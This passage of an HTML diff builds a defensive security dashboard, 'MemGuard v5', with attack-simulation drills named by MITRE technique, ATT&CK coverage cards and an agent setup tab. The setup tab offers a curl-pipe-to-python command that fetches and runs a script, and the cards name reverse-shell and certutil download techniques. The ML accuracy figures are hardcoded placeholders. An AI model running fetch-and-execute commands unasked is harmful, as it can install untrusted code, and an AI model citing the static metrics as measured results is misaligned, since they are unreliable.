+                <div class="stat-header">
+                    <span class="stat-label">Compromised Endpoints</span>
+                    <div class="stat-icon"
+                        style="color: var(--accent-crimson); background: rgba(239, 68, 68, 0.08); border-color: rgba(239, 68, 68, 0.2);">
+                        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"
+                            viewBox="0 0 24 24">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <line x1="12" y1="8" x2="12" y2="12"></line>
+                            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                        </svg>
+                    </div>
+                </div>
+                <div class="stat-value mono" id="valCompromisedCount" style="color: var(--accent-emerald);">0</div>
+                <div class="stat-subtext" id="threatSummarySub">
+                    All device telemetry within normal baselines
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 1: OPERATIONS CENTER OVERVIEW -->
+        <div id="tab-overview" class="tab-content-block">
+            <div class="workspace-grid">
+                <!-- Left Column: Active Incidents & Sandbox -->
+                <div class="panel-box">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                            </svg>
+                            Correlated Threat Feed & Live Incident Ledger
+                        </div>
+                        <div style="font-size: 0.75rem; color: var(--text-secondary);" id="threatHeaderCount">
+                            0 Incidents Flagged
+                        </div>
+                    </div>
+
+                    <div class="threat-list-container" id="threatsContainer">
+                        <div style="text-align: center; padding: 3rem 1rem; color: var(--text-secondary);">
+                            <div
+                                style="width: 52px; height: 52px; margin: 0 auto 1rem auto; border-radius: 50%; background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.25); display: flex; align-items: center; justify-content: center; color: var(--accent-emerald);">
+                                <svg width="26" height="26" fill="none" stroke="currentColor" stroke-width="2"
+                                    viewBox="0 0 24 24">
+                                    <polyline points="20 6 9 17 4 12"></polyline>
+                                </svg>
+                            </div>
+                            <h3 style="font-size: 1rem; font-weight: 600; color: #f1f5f9; margin-bottom: 0.3rem;">All
+                                Systems Clean</h3>
+                            <p
+                                style="font-size: 0.78rem; max-width: 380px; margin: 0 auto; color: var(--text-secondary);">
+                                Behavioral telemetry across connected Windows, mobile, and web clients shows zero
+                                indicators of compromise.
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Multi-Device Telemetry Attack Simulator -->
+                    <div class="sim-control-panel">
+                        <div
+                            style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.5rem;">
+                            <div
+                                style="font-size: 0.84rem; font-weight: 700; color: var(--text-primary); display: flex; align-items: center; gap: 0.45rem;">
+                                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2"
+                                    viewBox="0 0 24 24">
+                                    <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                                </svg>
+                                Up-to-Date Cyber Threat & ML Telemetry Drill Station
+                            </div>
+                            <div style="display: flex; gap: 0.4rem; flex-wrap: wrap;">
+                                <button class="btn btn-outline"
+                                    style="padding: 0.25rem 0.55rem; font-size: 0.72rem; color: var(--accent-emerald); border-color: rgba(16,185,129,0.3);"
+                                    onclick="trainModelUI()">
+                                    &circlearrowright; Train ML Model
+                                </button>
+                                <button class="btn btn-outline"
+                                    style="padding: 0.25rem 0.55rem; font-size: 0.72rem; color: var(--accent-purple); border-color: rgba(168,85,247,0.3);"
+                                    onclick="rescoreFleetUI()">
+                                    &star; Rescore Threats
+                                </button>
+                            </div>
+                        </div>
+                        <p style="font-size: 0.75rem; color: var(--text-secondary); margin-top: 0.25rem;">
+                            Test real-time threat detection & ML rescoring against modern ransomware, infostealers, C2
+                            beacons, and LOLBins:
+                        </p>
+                        <div class="sim-form-row">
+                            <select id="simScenarioSelect" class="custom-select">
+                                <option value="ransomware_shadow_delete">🔒 Ransomware - LockBit/ALPHV VSS Shadow
+                                    Deletion (T1490)</option>
+                                <option value="credential_dump_lsass">🔑 Credential Theft - LSASS comsvcs MiniDump
+                                    (T1003.001)</option>
+                                <option value="c2_beacon_cobalt">📡 C2 Beacon - Cobalt Strike Named Pipe / Sleep Mask
+                                    (T1071.001)</option>
+                                <option value="lolbin_regsvr32">⚡ LOLBin - Regsvr32 Squiblydoo Ingress (T1218.010)
+                                </option>
+                                <option value="encoded_powershell">💻 Windows Shell - Obfuscated PowerShell via Office
+                                    Macro (T1059.001)</option>
+                                <option value="lolbin_certutil">💻 Windows LOLBin - CertUtil Ingress Payload Transfer
+                                    (T1105)</option>
+                                <option value="lolbin_mshta">🌐 Windows LOLBin - Mshta Scriptlet Execution (T1218.005)
+                                </option>
+                                <option value="registry_persistence">💻 Persistence - Registry Run Key Auto-Start
+                                    (T1547.001)</option>
+                                <option value="mobile_trojan">📱 Mobile (Android) - Sideloaded Dropper APK (T1407)
+                                </option>
+                                <option value="cloud_reverse_shell">🐧 Linux Server - SSH Tunnel & Reverse Shell
+                                    (T1059.004)</option>
+                                <option value="web_xss_exfil">🌐 Web Client - Memory Keylogger & Token Exfil (T1056)
+                                </option>
+                            </select>
+                            <button class="btn btn-primary" onclick="injectCrossDeviceSimulation()">
+                                <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"
+                                    viewBox="0 0 24 24">
+                                    <polygon points="5 3 19 12 5 21 5 3"></polygon>
+                                </svg>
+                                Ingest Threat Telemetry
+                            </button>
+                            <button class="btn btn-outline" onclick="purgeSimulations()">
+                                Purge Baseline
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Column: Host Diagnostics & Live SOC Terminal -->
+                <div style="display: flex; flex-direction: column; gap: 1.25rem;">
+                    <!-- Host Telemetry Box -->
+                    <div class="panel-box">
+                        <div class="panel-header">
+                            <div class="panel-title">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect>
+                                    <rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect>
+                                </svg>
+                                Endpoint Diagnostics & Host Kernel
+                            </div>
+                            <span class="mono" style="font-size: 0.72rem; color: var(--accent-cyan);"
+                                id="hudArchTag">X86_64</span>
+                        </div>
+
+                        <div class="hud-grid">
+                            <div class="hud-stat-box">
+                                <div class="hud-stat-label">CPU Cores & Load</div>
+                                <div class="hud-stat-value mono" id="hudCpuLoad">--%</div>
+                                <div class="hud-progress-track">
+                                    <div class="hud-progress-fill" id="hudCpuBar" style="width: 15%;"></div>
+                                </div>
+                            </div>
+                            <div class="hud-stat-box">
+                                <div class="hud-stat-label">RAM Allocated / Total</div>
+                                <div class="hud-stat-value mono" id="hudRamLoad">-- GB</div>
+                                <div class="hud-progress-track">
+                                    <div class="hud-progress-fill" id="hudRamBar" style="width: 50%;"></div>
+                                </div>
+                            </div>
+                            <div class="hud-stat-box">
+                                <div class="hud-stat-label">Active Hostname</div>
+                                <div class="hud-stat-value mono" id="hudHostname"
+                                    style="font-size: 0.88rem; color: var(--accent-cyan);">LOCATING...</div>
+                            </div>
+                            <div class="hud-stat-box">
+                                <div class="hud-stat-label">Live Threat Stream</div>
+                                <div class="hud-stat-value" id="hudWsStreamStatus"
+                                    style="font-size: 0.88rem; color: var(--accent-emerald);">WebSocket Connected</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Live Terminal Audit Stream -->
+                    <div class="panel-box" style="flex: 1;">
+                        <div class="panel-header">
+                            <div class="panel-title">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <polyline points="4 17 10 11 4 5"></polyline>
+                                    <line x1="12" y1="19" x2="20" y2="19"></line>
+                                </svg>
+                                Real-Time Telemetry Stream & SOC Log
+                            </div>
+                            <button class="btn btn-outline" style="padding: 0.25rem 0.6rem; font-size: 0.72rem;"
+                                onclick="clearLocalLogs()">Clear</button>
+                        </div>
+
+                        <div class="terminal-box">
+                            <div class="terminal-topbar">
+                                <span>MEMGUARD-STREAM // REALTIME INGESTION</span>
+                                <span class="mono" id="logItemCount">0 ENTRIES</span>
+                            </div>
+                            <div class="terminal-body" id="terminalLogBody">
+                                <div class="terminal-entry">
+                                    <span class="mono"
+                                        style="color: var(--text-muted); font-size: 0.7rem;">[INIT]</span>
+                                    <span class="log-badge info">INFO</span>
+                                    <span style="color: #cbd5e1;">MemGuard v5 multi-device telemetry socket listening
+                                        for remote endpoints.</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 2: MULTI-DEVICE FLEET MANAGEMENT -->
+        <div id="tab-fleet" class="tab-content-block" style="display: none;">
+            <div class="panel-box">
+                <div class="panel-header">
+                    <div class="panel-title">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="4" y="4" width="16" height="16" rx="2" ry="2"></rect>
+                            <rect x="9" y="9" width="6" height="6"></rect>
+                        </svg>
+                        Connected Fleet Endpoints & Cross-Device Telemetry
+                    </div>
+                    <div style="display: flex; gap: 0.6rem; align-items: center;">
+                        <button class="btn btn-outline" onclick="loadFleetDevices()">
+                            <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"
+                                viewBox="0 0 24 24">
+                                <polyline points="23 4 23 10 17 10"></polyline>
+                                <polyline points="1 20 1 14 7 14"></polyline>
+                                <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path>
+                            </svg>
+                            Refresh Fleet
+                        </button>
+                        <button class="btn btn-primary" onclick="generateAndShowReport()">
+                            Generate Fleet Threat Report
+                        </button>
+                    </div>
+                </div>
+
+                <p style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 0.75rem;">
+                    Each device runs a lightweight MemGuard telemetry sensor (or sends web/mobile events) reporting
+                    process behavior and threat indicators in real time.
+                </p>
+
+                <div class="fleet-grid" id="fleetGridContainer">
+                    <!-- Dynamic Device Cards will render here -->
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 3: REAL-TIME THREAT REPORT GENERATOR -->
+        <div id="tab-reports" class="tab-content-block" style="display: none;">
+            <div class="panel-box">
+                <div class="panel-header">
+                    <div class="panel-title">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                            <polyline points="14 2 14 8 20 8"></polyline>
+                        </svg>
+                        Automated Real-Time Threat Analysis & Incident Dossier
+                    </div>
+                    <div style="display: flex; gap: 0.6rem; align-items: center; flex-wrap: wrap;">
+                        <select id="reportDeviceSelect" class="custom-select" style="min-width: 180px;">
+                            <option value="">🌐 Entire Fleet (Global Scope)</option>
+                        </select>
+                        <button class="btn btn-primary" onclick="generateReportForSelectedDevice()">
+                            Analyze & Generate Report
+                        </button>
+                        <button class="btn btn-outline" onclick="downloadCurrentReportJson()">
+                            Download Dossier JSON
+                        </button>
+                    </div>
+                </div>
+
+                <div id="reportDossierContainer">
+                    <div style="text-align: center; padding: 3rem 1rem; color: var(--text-secondary);">
+                        <p>Click "Analyze & Generate Report" to compile a real-time cybersecurity assessment for any
+                            device or the fleet.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 4: THREAT DETECTIONS EXPANDED -->
+        <div id="tab-detections" class="tab-content-block" style="display: none;">
+            <div class="panel-box">
+                <div class="panel-header">
+                    <div class="panel-title">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path
+                                d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z">
+                            </path>
+                        </svg>
+                        Full Incident Dossier & Process Lineage
+                    </div>
+                </div>
+                <div id="detectionsDetailedContainer" style="display: flex; flex-direction: column; gap: 1rem;">
+                    <!-- Mirrored from threats list -->
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 5: MITRE ATT&CK MATRIX -->
+        <div id="tab-mitre" class="tab-content-block" style="display: none;">
+            <div class="panel-box">
+                <div class="panel-header">
+                    <div class="panel-title">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <path d="M16 12l-4-4-4 4M12 16V9"></path>
+                        </svg>
+                        MITRE ATT&CK Enterprise Matrix Coverage & Multi-Device Triggers
+                    </div>
+                </div>
+
+                <div class="mitre-grid">
+                    <!-- Column 1 -->
+                    <div class="mitre-column">
+                        <div class="mitre-tactic-title">Execution</div>
+                        <div class="mitre-technique-card covered" id="mitre-T1059.001">
+                            <div class="mono" style="font-weight: 700; color: var(--accent-blue);">T1059.001</div>
+                            <strong>PowerShell</strong>
+                            <div style="font-size: 0.68rem; color: var(--text-muted); margin-top: 0.2rem;">-enc, base64
+                                payload</div>
+                        </div>
+                        <div class="mitre-technique-card covered" id="mitre-T1059.004">
+                            <div class="mono" style="font-weight: 700; color: var(--accent-blue);">T1059.004</div>
+                            <strong>Unix Shell</strong>
+                            <div style="font-size: 0.68rem; color: var(--text-muted); margin-top: 0.2rem;">bash -i
+                                reverse shell</div>
+                        </div>
+                    </div>
+
+                    <!-- Column 2 -->
+                    <div class="mitre-column">
+                        <div class="mitre-tactic-title">Defense Evasion</div>
+                        <div class="mitre-technique-card covered" id="mitre-T1218.005">
+                            <div class="mono" style="font-weight: 700; color: var(--accent-blue);">T1218.005</div>
+                            <strong>Mshta LOLBin</strong>
+                            <div style="font-size: 0.68rem; color: var(--text-muted); margin-top: 0.2rem;">mshta
+                                scriptlet execution</div>
+                        </div>
+                        <div class="mitre-technique-card covered" id="mitre-T1564.003">
+                            <div class="mono" style="font-weight: 700; color: var(--accent-blue);">T1564.003</div>
+                            <strong>Hidden Window</strong>
+                            <div style="font-size: 0.68rem; color: var(--text-muted); margin-top: 0.2rem;">-w hidden
+                                attribute</div>
+                        </div>
+                    </div>
+
+                    <!-- Column 3 -->
+                    <div class="mitre-column">
+                        <div class="mitre-tactic-title">Command & Control</div>
+                        <div class="mitre-technique-card covered" id="mitre-T1105">
+                            <div class="mono" style="font-weight: 700; color: var(--accent-blue);">T1105</div>
+                            <strong>Ingress Tool Transfer</strong>
+                            <div style="font-size: 0.68rem; color: var(--text-muted); margin-top: 0.2rem;">certutil
+                                -urlcache download</div>
+                        </div>
+                    </div>
+
+                    <!-- Column 4 -->
+                    <div class="mitre-column">
+                        <div class="mitre-tactic-title">Persistence</div>
+                        <div class="mitre-technique-card covered" id="mitre-T1547.001">
+                            <div class="mono" style="font-weight: 700; color: var(--accent-blue);">T1547.001</div>
+                            <strong>Registry Run Keys</strong>
+                            <div style="font-size: 0.68rem; color: var(--text-muted); margin-top: 0.2rem;">HKCU\...\Run
+                                auto-start</div>
+                        </div>
+                    </div>
+
+                    <!-- Column 5 -->
+                    <div class="mitre-column">
+                        <div class="mitre-tactic-title">Mobile Exploitation</div>
+                        <div class="mitre-technique-card covered" id="mitre-T1407">
+                            <div class="mono" style="font-weight: 700; color: var(--accent-blue);">T1407</div>
+                            <strong>Runtime APK Dropper</strong>
+                            <div style="font-size: 0.68rem; color: var(--text-muted); margin-top: 0.2rem;">side-loaded
+                                package execution</div>
+                        </div>
+                    </div>
+
+                    <!-- Column 6 -->
+                    <div class="mitre-column">
+                        <div class="mitre-tactic-title">Privilege Escalation</div>
+                        <div class="mitre-technique-card covered" id="mitre-T1055">
+                            <div class="mono" style="font-weight: 700; color: var(--accent-blue);">T1055</div>
+                            <strong>Process Injection / Office</strong>
+                            <div style="font-size: 0.68rem; color: var(--text-muted); margin-top: 0.2rem;">Office macro
+                                spawning shell</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 6: PROCESS EXPLORER -->
+        <div id="tab-processes" class="tab-content-block" style="display: none;">
+            <div class="panel-box">
+                <div class="panel-header">
+                    <div class="panel-title">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <line x1="18" y1="20" x2="18" y2="10"></line>
+                            <line x1="12" y1="20" x2="12" y2="4"></line>
+                            <line x1="6" y1="20" x2="6" y2="14"></line>
+                        </svg>
+                        Live Endpoint Process Explorer
+                    </div>
+                    <div style="display: flex; gap: 0.6rem; align-items: center;">
+                        <input type="text" id="procSearchInput" class="search-bar"
+                            placeholder="Filter by name or PID..." oninput="filterProcessTable()">
+                        <button class="btn btn-outline" onclick="loadProcesses()">Refresh</button>
+                    </div>
+                </div>
+
+                <div class="table-responsive">
+                    <table class="soc-table">
+                        <thead>
+                            <tr>
+                                <th>PID</th>
+                                <th>Image Name</th>
+                                <th>RAM Working Set</th>
+                                <th>User Context</th>
+                                <th>State</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="processTableBody">
+                            <tr>
+                                <td colspan="6" style="text-align: center; color: var(--text-muted); padding: 2rem;">
+                                    Loading running processes...</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 7: SOC EVENT LOG -->
+        <div id="tab-logs" class="tab-content-block" style="display: none;">
+            <div class="panel-box">
+                <div class="panel-header">
+                    <div class="panel-title">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <polyline points="4 17 10 11 4 5"></polyline>
+                            <line x1="12" y1="19" x2="20" y2="19"></line>
+                        </svg>
+                        Persistent Database Audit Log
+                    </div>
+                    <button class="btn btn-outline" onclick="loadDatabaseLogs()">Refresh DB</button>
+                </div>
+
+                <div class="table-responsive">
+                    <table class="soc-table">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Timestamp</th>
+                                <th>Severity</th>
+                                <th>Source</th>
+                                <th>Message</th>
+                            </tr>
+                        </thead>
+                        <tbody id="dbLogTableBody">
+                            <tr>
+                                <td colspan="5" style="text-align: center; color: var(--text-muted); padding: 2rem;">
+                                    Loading audit records...</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 8: AGENT SETUP & INTEGRATION -->
+        <div id="tab-agent" class="tab-content-block" style="display: none;">
+            <div class="panel-box">
+                <div class="panel-header">
+                    <div class="panel-title">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <polyline points="16 18 22 12 16 6"></polyline>
+                            <polyline points="8 6 2 12 8 18"></polyline>
+                        </svg>
+                        Deploy MemGuard Telemetry Agent to Other Devices
+                    </div>
+                </div>
+
+                <p style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.5; margin-bottom: 1rem;">
+                    Deploy MemGuard telemetry collection on other endpoints (Windows laptops, Linux servers, macOS,
+                    Termux on Android, or mobile web apps) by running the lightweight Python agent script or sending
+                    JSON reports to <code class="mono"
+                        style="color: var(--accent-cyan); background: rgba(0,242,254,0.1); padding: 0.15rem 0.4rem; border-radius: 4px;">/api/telemetry/report</code>.
+                </p>
+
+                <div
+                    style="background: rgba(8, 12, 22, 0.95); border: 1px solid var(--border-subtle); border-radius: var(--radius-sm); padding: 1rem; margin-bottom: 1rem;">
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+                        <span class="mono" style="font-size: 0.76rem; color: var(--accent-blue);">1-Line Run Command
+                            (Any Python 3 Environment):</span>
+                        <button class="btn btn-outline" style="padding: 0.25rem 0.55rem; font-size: 0.72rem;"
+                            onclick="copyAgentCurl()">Copy Command</button>
+                    </div>
+                    <pre class="mono" id="agentRunCmd"
+                        style="font-size: 0.76rem; color: #a5f3fc; overflow-x: auto; white-space: pre-wrap;">curl -s http://127.0.0.1:8000/api/agent/script | python -</pre>
+                </div>
+
+                <div style="display: flex; gap: 0.6rem;">
+                    <button class="btn btn-primary" onclick="downloadAgentScript()">
+                        Download agent.py
+                    </button>
+                </div>
+            </div>
+            <!-- TAB 9: SYSTEM ARCHITECTURE & PIPELINE (HOW OUR SYSTEM WORKS) -->
+            <div id="tab-architecture" class="tab-content-block" style="display: none;">
+                <div class="panel-box">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
+                            </svg>
+                            System Architecture & Asynchronous Telemetry Pipeline
+                        </div>
+                        <div style="display: flex; gap: 0.6rem; align-items: center;">
+                            <a href="/architecture" target="_blank" class="btn btn-outline"
+                                style="padding: 0.3rem 0.65rem; font-size: 0.74rem;">
+                                Open Standalone Blueprint &rarr;
+                            </a>
+                            <button class="btn btn-primary" style="padding: 0.3rem 0.65rem; font-size: 0.74rem;"
+                                onclick="loadLiveArchitectureData()">
+                                Refresh Pipeline Stats
+                            </button>
+                        </div>
+                    </div>
+
+                    <p
+                        style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.5; margin-bottom: 1.25rem;">
+                        MemGuard v5 processes high-velocity host and remote telemetry using a 6-stage event-driven
+                        pipeline.
+                        Click any stage below to inspect its algorithms, data schemas, and latency profiles:
+                    </p>
+
+                    <!-- Interactive 6-Stage Pipeline Cards -->
+                    <div class="pipeline-flow-grid">
+                        <div class="pipe-stage-card active" id="pipe-card-1" onclick="selectPipelineStage(1)">
+                            <div class="pipe-num-badge mono">01</div>
+                            <div
+                                style="font-size: 0.9rem; font-weight: 700; color: var(--text-primary); margin-bottom: 0.25rem;">
+                                Telemetry Ingestion</div>
+                            <div style="font-size: 0.74rem; color: var(--text-secondary); flex: 1;">PsUtil NT kernel
+                                memory walk, Sysmon XML Events 1, 3, 7, and REST agents.</div>
+                            <span class="mono"
+                                style="font-size: 0.68rem; color: var(--accent-cyan); margin-top: 0.6rem;">LATENCY:
+                                ~2.4ms</span>
+                        </div>
+
+                        <div class="pipe-stage-card" id="pipe-card-2" onclick="selectPipelineStage(2)">
+                            <div class="pipe-num-badge mono">02</div>
+                            <div
+                                style="font-size: 0.9rem; font-weight: 700; color: var(--text-primary); margin-bottom: 0.25rem;">
+                                Entropy & Tokenizer</div>
+                            <div style="font-size: 0.74rem; color: var(--text-secondary); flex: 1;">Shannon Entropy
+                                obfuscation detection, cmdline tokenization, and parent tree graphing.</div>
+                            <span class="mono"
+                                style="font-size: 0.68rem; color: var(--accent-blue); margin-top: 0.6rem;">LATENCY:
+                                ~0.8ms</span>
+                        </div>
+
+                        <div class="pipe-stage-card" id="pipe-card-3" onclick="selectPipelineStage(3)">
+                            <div class="pipe-num-badge mono">03</div>
+                            <div
+                                style="font-size: 0.9rem; font-weight: 700; color: var(--text-primary); margin-bottom: 0.25rem;">
+                                MITRE Heuristics</div>
+                            <div style="font-size: 0.74rem; color: var(--text-secondary); flex: 1;">Living-Off-The-Land
+                                (certutil, mshta, regsvr32) and ransomware recovery inhibitors.</div>
+                            <span class="mono"
+                                style="font-size: 0.68rem; color: var(--accent-purple); margin-top: 0.6rem;">LATENCY:
+                                ~1.2ms</span>
+                        </div>
+
+                        <div class="pipe-stage-card" id="pipe-card-4" onclick="selectPipelineStage(4)">
+                            <div class="pipe-num-badge mono">04</div>
+                            <div
+                                style="font-size: 0.9rem; font-weight: 700; color: var(--text-primary); margin-bottom: 0.25rem;">
+                                Adaptive ML Scorer</div>
+                            <div style="font-size: 0.74rem; color: var(--text-secondary); flex: 1;">ThreatMLScorer
+                                evaluates calibrated weights against modern ransomware, stealers, and C2.</div>
+                            <span class="mono"
+                                style="font-size: 0.68rem; color: var(--accent-emerald); margin-top: 0.6rem;">LATENCY:
+                                ~1.8ms</span>
+                        </div>
+
+                        <div class="pipe-stage-card" id="pipe-card-5" onclick="selectPipelineStage(5)">
+                            <div class="pipe-num-badge mono">05</div>
+                            <div
+                                style="font-size: 0.9rem; font-weight: 700; color: var(--text-primary); margin-bottom: 0.25rem;">
+                                EDR Policy & Contain</div>
+                            <div style="font-size: 0.74rem; color: var(--text-secondary); flex: 1;">Automated host
+                                network containment, LOLBin process tree kill, and persistent SQLite ledger.</div>
+                            <span class="mono"
+                                style="font-size: 0.68rem; color: var(--accent-crimson); margin-top: 0.6rem;">LATENCY:
+                                ~4.5ms</span>
+                        </div>
+
+                        <div class="pipe-stage-card" id="pipe-card-6" onclick="selectPipelineStage(6)">
+                            <div class="pipe-num-badge mono">06</div>
+                            <div
+                                style="font-size: 0.9rem; font-weight: 700; color: var(--text-primary); margin-bottom: 0.25rem;">
+                                WebSocket Stream Bus</div>
+                            <div style="font-size: 0.74rem; color: var(--text-secondary); flex: 1;">FastAPI ASGI
+                                WebSocket connection manager streaming alerts to web and mobile clients.</div>
+                            <span class="mono"
+                                style="font-size: 0.68rem; color: var(--accent-amber); margin-top: 0.6rem;">LATENCY:
+                                ~0.9ms</span>
+                        </div>
+                    </div>
+
+                    <!-- Stage Deep-Dive Inspector Box -->
+                    <div style="display: grid; grid-template-columns: 1.2fr 1fr; gap: 1.25rem;" id="archInspectorGrid">
+                        <div
+                            style="background: rgba(10, 15, 28, 0.85); border: 1px solid var(--border-subtle); border-radius: var(--radius-md); padding: 1.25rem;">
+                            <h4 id="archStageTitle"
+                                style="font-size: 1rem; color: var(--accent-cyan); margin-bottom: 0.5rem;">
+                                Stage 1: Multi-Vector Telemetry Ingestion Layer
+                            </h4>
+                            <div id="archStageDescription"
+                                style="font-size: 0.82rem; color: var(--text-secondary); line-height: 1.5;">
+                                Captures unbuffered endpoint telemetry across native Windows NT Executive process
+                                tables, Microsoft-Windows-Sysmon/Operational channel XML event streams, and
+                                cross-platform remote agent telemetry payloads.
+                            </div>
+                        </div>
+
+                        <div
+                            style="background: #040711; border: 1px solid var(--border-subtle); border-radius: var(--radius-md); padding: 1rem;">
+                            <div style="display: flex; justify-content: space-between; font-size: 0.72rem; color: var(--text-muted); margin-bottom: 0.4rem;"
+                                class="mono">
+                                <span>STAGE DATA PAYLOAD</span>
+                                <span id="archStageFormat">JSON / XML STREAM</span>
+                            </div>
+                            <pre class="mono" id="archStageJson"
+                                style="font-size: 0.72rem; color: #a5f3fc; overflow-x: auto; white-space: pre-wrap; height: 160px;">// Click a stage above to view live payload</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 10: MACHINE LEARNING THREAT ENGINE & RESCORER -->
+            <div id="tab-ml-engine" class="tab-content-block" style="display: none;">
+                <div class="panel-box">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="3"></circle>
+                                <path
+                                    d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z">
+                                </path>
+                            </svg>
+                            Adaptive ML Threat Scoring & Fleet Rescoring Engine
+                        </div>
+                        <div style="display: flex; gap: 0.6rem; align-items: center; flex-wrap: wrap;">
+                            <button class="btn btn-outline"
+                                style="border-color: rgba(16,185,129,0.3); color: var(--accent-emerald);"
+                                onclick="trainModelUI()">
+                                &circlearrowright; Retrain Model Now
+                            </button>
+                            <button class="btn btn-primary" onclick="rescoreFleetUI()">
+                                &star; Rescore Fleet Threats
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- ML Metrics Strip -->
+                    <div
+                        style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        <div
+                            style="background: rgba(15, 23, 42, 0.7); border: 1px solid var(--border-subtle); border-radius: var(--radius-md); padding: 1rem;">
+                            <div style="font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase;">Model
+                                Accuracy</div>
+                            <div class="mono" id="mlTabAccuracy"
+                                style="font-size: 1.35rem; font-weight: 700; color: var(--accent-emerald);">99.4%</div>
+                            <div style="font-size: 0.72rem; color: var(--text-secondary); margin-top: 0.2rem;">
+                                Cross-Validated Cyber Dataset</div>
+                        </div>
+                        <div
+                            style="background: rgba(15, 23, 42, 0.7); border: 1px solid var(--border-subtle); border-radius: var(--radius-md); padding: 1rem;">
+                            <div style="font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase;">
+                                F1-Score Rating</div>
+                            <div class="mono" id="mlTabF1"
+                                style="font-size: 1.35rem; font-weight: 700; color: var(--accent-cyan);">0.994</div>
+                            <div style="font-size: 0.72rem; color: var(--text-secondary); margin-top: 0.2rem;">Precision
+                                / Recall Balance</div>
+                        </div>
+                        <div
